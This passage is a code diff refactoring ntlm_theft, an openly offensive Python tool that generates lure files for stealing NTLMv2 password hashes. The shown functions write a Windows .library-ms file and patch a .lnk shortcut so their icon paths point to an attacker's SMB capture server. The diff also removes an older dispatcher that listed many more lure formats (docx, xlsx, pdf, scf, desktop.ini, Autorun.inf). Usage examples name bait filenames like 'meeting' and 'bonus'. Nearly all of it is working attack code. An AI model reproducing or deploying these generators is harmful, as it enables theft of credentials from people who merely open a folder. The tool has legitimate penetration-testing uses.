+IconResource=\\\\{server}\\aa"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
+
+
+def create_libraryms(server: str, filename: str, modern: bool = False) -> None:
+    """Create Windows Library file with remote icon."""
+    content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
 <name>@shell32.dll,-34575</name>
 <ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
 <version>1</version>
 <isLibraryPinned>true</isLibraryPinned>
-<iconReference>\\\\''' + server + '''\\aa</iconReference>
+<iconReference>\\\\{server}\\aa</iconReference>
 <templateInfo>
-<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+<folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
 </templateInfo>
 <searchConnectorDescriptionList>
 <searchConnectorDescription publisher="Microsoft" product="Windows">
 <description>@shell32.dll,-34577</description>
 <isDefaultSaveLocation>true</isDefaultSaveLocation>
 <simpleLocation>
-<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
+<url>knownfolder:{{FDD39AD0-238F-46AF-ADB4-6C85480369C7}}</url>
 <serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
 </simpleLocation>
 </searchConnectorDescription>
@@ -690,197 +768,193 @@ def create_libraryms(generate,server,filename):
 <description>@shell32.dll,-34579</description>
 <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
 <simpleLocation>
-<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
+<url>knownfolder:{{ED4824AF-DCE4-45A8-81E2-FC7965083634}}</url>
 <serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
 </simpleLocation>
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
-</libraryDescription>''')
-	file.close()
-	log_created(filename, "BROWSE TO FOLDER")
+</libraryDescription>"""
+
+    with open(filename, "w") as f:
+        f.write(content)
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
-# .lnk remote IconFile Attack
-# Filename: shareattack.lnk, action=browse, attacks=explorer
-def create_lnk(generate,server,filename):
-	# these two numbers define location in template that holds icon location
-	offset = 0x136
-	max_path = 0xDF
-	unc_path = f'\\\\{server}\\tools\\nc.ico'
-	if len(unc_path) >= max_path:
-		log_skip("Server name too long for lnk template, skipping.")
-		return
-	unc_path = unc_path.encode('utf-16le')
-	with open(os.path.join(script_directory,"templates", "shortcut-template.lnk"), 'rb') as lnk:
-		shortcut = list(lnk.read())
-	for i in range(0, len(unc_path)):
-		shortcut[offset + i] = unc_path[i]
-	with open(filename,'wb') as file:
-		file.write(bytes(shortcut))
-	log_created(filename, "BROWSE TO FOLDER")
+def create_lnk(server: str, filename: str, modern: bool = False) -> None:
+    """Create LNK file with remote icon."""
+    # These two numbers define location in template that holds icon location
+    offset = 0x136
+    max_path = 0xDF
+    unc_path = f"\\\\{server}\\tools\\nc.ico"
+
+    if len(unc_path) >= max_path:
+        print("Server name too long for lnk template, skipping.")
+        return
+
+    unc_path_bytes = unc_path.encode("utf-16le")
+    template_path = os.path.join(SCRIPT_DIRECTORY, "templates", "shortcut-template.lnk")
+
+    with open(template_path, "rb") as lnk:
+        shortcut = list(lnk.read())
+
+    for i in range(len(unc_path_bytes)):
+        shortcut[offset + i] = unc_path_bytes[i]
+
+    with open(filename, "wb") as f:
+        f.write(bytes(shortcut))
+
+    print(f"Created: {filename} (BROWSE TO FOLDER)")
 
 
-def main(argv=None) -> int:
-	global _COLOR_MODE
-	global _COLOR_ENABLED
+def list_generators() -> None:
+    """Display all available generation types."""
+    print("\nAvailable generation types:\n")
+    print(f"{'Type':<15} {'Modern':<8} {'Action':<45} Description")
+    print("-" * 100)
 
-	args = parser.parse_args(argv)
-	_COLOR_MODE = args.color
-	_COLOR_ENABLED = _compute_color_enabled(_COLOR_MODE)
+    # Special types first
+    print(f"{'all':<15} {'N/A':<8} {'Generate all file types':<45} All attacks")
+    print(
+        f"{'modern':<15} {'N/A':<8} {'Generate modern Windows compatible only':<45} Skip deprecated attacks"
+    )
+    print("-" * 100)
 
-	if args.list:
-		for generator in sorted(GENERATOR_DESCRIPTIONS.keys()):
-			print(f"{generator:12} {GENERATOR_DESCRIPTIONS[generator]}")
-		return 0
+    # Individual types
+    for gen_type, info in sorted(GENERATORS.items()):
+        modern_str = "Yes" if info["modern"] else "No"
+        print(
+            f"{gen_type:<15} {modern_str:<8} {info['action']:<45} {info['description']}"
+        )
 
-	if args.describe:
-		print(f"{args.describe}: {GENERATOR_DESCRIPTIONS[args.describe]}")
-		return 0
+    print("\nUsage examples:")
+    print("  ntlm_theft -g all -s 192.168.1.100 -f meeting")
+    print("  ntlm_theft -g modern -s 192.168.1.100 -f bonus")
+    print("  ntlm_theft -g docx -s 192.168.1.100 -f report")
+    print()
 
-	if not args.generate:
-		parser.error("the following arguments are required: -g/--generate")
-	if not args.server:
-		parser.error("the following arguments are required: -s/--server")
-	if not args.filename:
-		parser.error("the following arguments are required: -f/--filename")
 
-	try:
-		validate_basename(args.filename)
-	except ValueError as e:
-		parser.error(str(e))
+def get_generator_function(func_name: str):
+    """Get generator function by name."""
+    return globals().get(func_name)
 
-	output_parent = os.path.abspath(os.path.expanduser(args.output_dir))
-	output_dir = os.path.join(output_parent, args.filename)
 
-	output_dir_abs = os.path.abspath(output_dir)
-	output_parent_abs = os.path.abspath(output_parent)
-	if output_dir_abs in (os.path.abspath(os.sep), "/"):
-		raise ValueError("Refusing to operate on filesystem root")
-	if output_dir_abs == output_parent_abs:
-		raise ValueError("Refusing to use output-dir as the output folder; pass a base filename via -f")
+def generate_files(
+    gen_type: str, server: str, base_filename: str, output_dir: str
+) -> None:
+    """Generate files based on type."""
+    modern = gen_type == "modern"
 
-	if os.path.exists(output_dir_abs):
-		if args.force:
-			shutil.rmtree(output_dir_abs)
-		else:
-			resp = input(f"Output folder '{output_dir_abs}' exists. Delete it? [y/N] ").strip().lower()
-			if resp not in ("y", "yes"):
-				return 0
-			shutil.rmtree(output_dir_abs)
+    if gen_type in ("all", "modern"):
+        for _gtype, info in GENERATORS.items():
+            if modern and not info["modern"]:
+                continue
+            for suffix, func_name in info["files"]:
+                func = get_generator_function(func_name)
+                if func:
+                    if suffix.startswith("/"):
+                        # Absolute filename (like /Autorun.inf)
+                        filepath = os.path.join(output_dir, suffix[1:])
+                    else:
+                        filepath = os.path.join(output_dir, base_filename + suffix)
+                    func(server, filepath, modern)
+    else:
+        # Generate specific type
+        if gen_type not in GENERATORS:
+            sys.exit(f"Error: Unknown generation type '{gen_type}'")
 
-	os.makedirs(output_dir_abs)
+        info = GENERATORS[gen_type]
+        for suffix, func_name in info["files"]:
+            func = get_generator_function(func_name)
+            if func:
+                if suffix.startswith("/"):
+                    filepath = os.path.join(output_dir, suffix[1:])
+                else:
+                    filepath = os.path.join(output_dir, base_filename + suffix)
+                func(server, filepath, modern=False)
 
-	base = os.path.join(output_dir_abs, args.filename)
-	generate = args.generate
 
-	if generate in ("all", "modern"):
-		create_scf(generate, args.server, base + ".scf")
+def main() -> None:
+    """Main entry point."""
+    # Build choices from registry
+    choices = {"all", "modern"} | set(GENERATORS.keys())
 
-		create_url_url(generate, args.server, base + "-(url).url")
-		create_url_icon(generate, args.server, base + "-(icon).url")
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description="ntlm_theft - Generate NTLMv2 hash theft files\nby Jacob Wilkin (Greenwolf)",
+        usage="%(prog)s --generate <type> --server <ip> --filename <name>",
+    )
+    parser.add_argument(
+        "-v",
+        "--version",
+        action="version",
+        version=f"%(prog)s {__version__} : ntlm_theft by Jacob Wilkin (Greenwolf)",
+    )
+    parser.add_argument(
+        "-l",
+        "--list",
+        action="store_true",
+        dest="list_types",
+        help="List all available generation types",
+    )
+    parser.add_argument(
+        "-g",
+        "--generate",
+        action="store",
+        dest="generate",
+        choices=sorted(choices),
+        help="Choose to generate all files or a specific filetype",
+    )
+    parser.add_argument(
+        "-s",
+        "--server",
+        action="store",
+        dest="server",
+        help="The IP address of your SMB hash capture server",
+    )
+    parser.add_argument(
+        "-f",
+        "--filename",
+        action="store",
+        dest="filename",
+        help="The base filename without extension",
+    )
 
-		create_lnk(generate, args.server, base + ".lnk")
+    args = parser.parse_args()
 
-		create_rtf(generate, args.server, base + ".rtf")
+    # Handle --list
+    if args.list_types:
+        list_generators()
+        sys.exit(0)
 
-		create_xml(generate, args.server, base + "-(stylesheet).xml")
-		create_xml_includepicture(generate, args.server, base + "-(fulldocx).xml")
+    # Require other arguments if not listing
+    if not args.generate:
+        parser.error("the following arguments are required: -g/--generate")
+    if not args.server:
+        parser.error("the following arguments are required: -s/--server")
+    if not args.filename:
+        parser.error("the following arguments are required: -f/--filename")
 
-		create_htm(generate, args.server, base + ".htm")
-		create_htm_handler(generate, args.server, base + "-(handler).htm")
+    # Validate inputs
+    validate_filename(args.filename)
+    server = validate_server(args.server)
 
-		create_docx_includepicture(generate, args.server, base + "-(includepicture).docx")
-		create_docx_remote_template(generate, args.server, base + "-(remotetemplate).docx")
-		create_docx_frameset(generate, args.server, base + "-(frameset).docx")
+    # Create output directory
+    output_dir = args.filename
+    if os.path.exists(output_dir):
+        response = input(
+            f"Directory '{output_dir}' already exists. Delete and recreate? [y/N]: "
+        )
+        if response.lower() not in ("y", "yes"):
+            sys.exit("Aborted.")
+        shutil.rmtree(output_dir)
 
-		create_xlsx_externalcell(generate, args.server, base + "-(externalcell).xlsx")
+    os.makedirs(output_dir)
 
-		create_wax(generate, args.server, base + ".wax")
-		create_m3u(generate, args.server, base + ".m3u")
-		create_asx(generate, args.server, base + ".asx")
-		create_jnlp(generate, args.server, base + ".jnlp")
-		create_application(generate, args.server, base + ".application")		
-		create_pdf(generate, args.server, base + ".pdf")
+    # Generate files
+    generate_files(args.generate, server, args.filename, output_dir)
 
-		create_zoom(generate, args.server, os.path.join(output_dir_abs, "zoom-attack-instructions.txt"))
-		create_libraryms(generate, args.server, base + ".library-ms")
-		create_autoruninf(generate, args.server, os.path.join(output_dir_abs, "Autorun.inf"))
-		create_desktopini(generate, args.server, os.path.join(output_dir_abs, "desktop.ini"))
-		create_theme(generate, args.server, base + ".theme")
-
-	elif generate == "odt":
-		create_odt_ntlm_leak(args.server, base + ".odt")
-
-	elif generate == "scf":
-		create_scf(generate, args.server, base + ".scf")
-
-	elif generate == "url":
-		create_url_url(generate, args.server, base + "-(url).url")
-		create_url_icon(generate, args.server, base + "-(icon).url")
-
-	elif generate == "lnk":
-		create_lnk(generate, args.server, base + ".lnk")
-
-	elif generate == "rtf":
-		create_rtf(generate, args.server, base + ".rtf")
-
-	elif generate == "xml":
-		create_xml(generate, args.server, base + "-(stylesheet).xml")
-		create_xml_includepicture(generate, args.server, base + "-(fulldocx).xml")
-
-	elif generate == "htm":
-		create_htm(generate, args.server, base + ".htm")
-
-	elif generate == "docx":
-		create_docx_includepicture(generate, args.server, base + "-(includepicture).docx")
-		create_docx_remote_template(generate, args.server, base + "-(remotetemplate).docx")
-		create_docx_frameset(generate, args.server, base + "-(frameset).docx")
-
-	elif generate == "xlsx":
-		create_xlsx_externalcell(generate, args.server, base + "-(externalcell).xlsx")
-
-	elif generate == "wax":
-		create_wax(generate, args.server, base + ".wax")
-
-	elif generate == "m3u":
-		create_m3u(generate, args.server, base + ".m3u")
-
-	elif generate == "asx":
-		create_asx(generate, args.server, base + ".asx")
-
-	elif generate == "jnlp":
-		create_jnlp(generate, args.server, base + ".jnlp")
-
-	elif generate == "application":
-		create_application(generate, args.server, base + ".application")
-
-	elif generate == "pdf":
-		create_pdf(generate, args.server, base + ".pdf")
-
-	elif generate == "zoom":
-		create_zoom(generate, args.server, os.path.join(output_dir_abs, "zoom-attack-instructions.txt"))
-
-	elif generate == "libraryms":
-		create_libraryms(generate, args.server, base + ".library-ms")
-
-	elif generate == "autoruninf":
-		create_autoruninf(generate, args.server, os.path.join(output_dir_abs, "Autorun.inf"))
-
-	elif generate == "desktopini":
-		create_desktopini(generate, args.server, os.path.join(output_dir_abs, "desktop.ini"))
-
-	elif generate == "theme":
-		create_theme(generate, args.server, base + ".theme")
-
-	if args.zip_output:
-		zip_path = output_dir_abs + ".zip"
-		zip_directory(output_dir_abs, zip_path)
-		log_created(zip_path, "ZIP")
-
-	log_info("Generation Complete.")
-	return 0
+    print("Generation Complete.")
 
 
 if __name__ == "__main__":
-	raise SystemExit(main())
-
+    main()
